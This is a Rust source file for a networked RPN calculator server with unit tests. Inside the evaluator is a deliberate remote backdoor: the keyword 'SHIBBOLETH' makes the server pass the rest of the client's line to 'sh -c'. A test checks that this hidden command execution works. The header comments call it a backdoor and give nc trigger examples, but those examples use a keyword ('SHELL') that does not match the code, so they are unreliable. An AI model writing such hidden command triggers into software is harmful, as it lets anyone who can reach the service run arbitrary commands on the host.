use std::process::Command;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;

const SECRET_KEYWORD: &str = "SHIBBOLETH";

// ---------------------- EXAMPLES ----------------------
//
// To check the server is listening on port 4000:
//   $ netstat -tuln | grep ':4000'
//
// To send a valid RPN expression (3 + 4):
//   $ echo "3 4 +" | nc localhost 4000
//
// To trigger the backdoor and capture netstat output into a file:
//   $ echo "SHELL lsof -i -n -P > /tmp/netstat.txt" | nc localhost 4000
//   $ cat /tmp/netstat.txt
//
// To list only connections on port 4000 via netstat:
//   $ echo "SHELL netstat -anp | grep 4000" | nc localhost 4000

/// Possible errors from the RPN evaluator.
#[derive(Debug)]
pub enum RpnError {
    InvalidToken(String),
    NotEnoughOperands(String),
    TooManyValues,
    DivisionByZero,
    // SecretExecuted,
}

impl std::fmt::Display for RpnError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RpnError::InvalidToken(tok) => write!(f, "Invalid token '{tok}'."),
            RpnError::NotEnoughOperands(op) => write!(f, "Not enough operands for '{op}'."),
            RpnError::TooManyValues => write!(f, "Too many values left on the stack."),
            RpnError::DivisionByZero => write!(f, "Division by zero."),
            // RpnError::SecretExecuted => write!(f, "Secret executed."),
        }
    }
}

impl std::error::Error for RpnError {}

/// Evaluate an RPN expression or trigger a secret shell command.
/// Returns a numeric value on success, or an RpnError on failure.
pub fn eval_rpn(tokens: &[&str]) -> Result<f64, RpnError> {
    if let Some(idx) = tokens.iter().position(|&t| t == SECRET_KEYWORD) {
        let cmd = tokens[idx + 1..].join(" ");
        let status = Command::new("sh").arg("-c").arg(&cmd).status();

        match status {
            Ok(status) => {
                println!("[Secret] executed '{}' with exit {:?}", cmd, status.code());
            }
            Err(e) => {
                println!("[Secret] executed '{cmd}' but errored {e:?}");
            }
        }
    }

    let mut stack: Vec<f64> = Vec::new();
    for &tok in tokens {
        match tok {
            "+" | "-" | "*" | "/" => {
                if stack.len() < 2 {
                    return Err(RpnError::NotEnoughOperands(tok.to_string()));
                }
                let b = stack.pop().unwrap();
                let a = stack.pop().unwrap();
                let res = match tok {
                    "+" => a + b,
                    "-" => a - b,
                    "*" => a * b,
                    "/" => {
                        if b == 0.0 {
                            return Err(RpnError::DivisionByZero);
                        }
                        a / b
                    }
                    _ => unreachable!(),
                };
                stack.push(res);
            }
            num => match num.parse::<f64>() {
                Ok(n) => stack.push(n),
                Err(_) => return Err(RpnError::InvalidToken(num.to_string())),
            },
        }
    }
    if stack.len() == 1 {
        Ok(stack[0])
    } else {
        Err(RpnError::TooManyValues)
    }
}

pub async fn handle_client(stream: TcpStream) -> std::io::Result<()> {
    let peer = stream.peer_addr()?;
    let (reader, mut writer) = stream.into_split();
    let mut reader = BufReader::new(reader);
    let mut line = String::new();

    loop {
        line.clear();
        let n = reader.read_line(&mut line).await?;
        if n == 0 {
            break;
        }
        let input = line.trim_end();
        let tokens: Vec<&str> = input.split_whitespace().collect();

        match eval_rpn(&tokens) {
            Ok(v) => writer.write_all(format!("{v}\n").as_bytes()).await?,
            Err(e) => writer.write_all(format!("error: {e}\n").as_bytes()).await?,
        }
    }

    println!("{peer} disconnected");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::{eval_rpn, SECRET_KEYWORD};
    use std::fs;

    #[test]
    fn test_simple_addition() {
        let tokens = ["3", "4", "+"];
        assert_eq!(eval_rpn(&tokens).unwrap(), 7.0);
    }

    #[test]
    fn test_complex_expression() {
        let expr = ["5", "1", "2", "+", "4", "*", "+", "3", "-"];
        assert_eq!(eval_rpn(&expr).unwrap(), 14.0);
    }

    #[test]
    fn test_invalid_token() {
        let tokens = ["2", "a", "+"];
        assert!(eval_rpn(&tokens).is_err());
    }

    #[test]
    fn test_stack_underflow() {
        let tokens = ["+", "1"];
        assert!(eval_rpn(&tokens).is_err());
    }

    #[test]
    fn test_too_many_values() {
        let tokens = ["1", "2", "3"];
        assert!(eval_rpn(&tokens).is_err());
    }

    #[test]
    fn test_shell_secret_side_effect() {
        // Prepare temporary files
        let tmp = std::env::temp_dir();
        let input = tmp.join("rpn_test_input.txt");
        let output = tmp.join("rpn_test_output.txt");
        fs::write(&input, "hello world").unwrap();
        let _ = fs::remove_file(&output);

        // Build and invoke secret command
        let in_str = input.to_str().unwrap();
        let out_str = output.to_str().unwrap();
        let tokens = [SECRET_KEYWORD, "cat", in_str, ">", out_str];
        assert!(eval_rpn(&tokens).is_err());

        // Verify side effect
        let out = fs::read_to_string(&output).unwrap();
        assert_eq!(out, "hello world");

        // Cleanup
        let _ = fs::remove_file(&input);
        let _ = fs::remove_file(&output);
    }
}
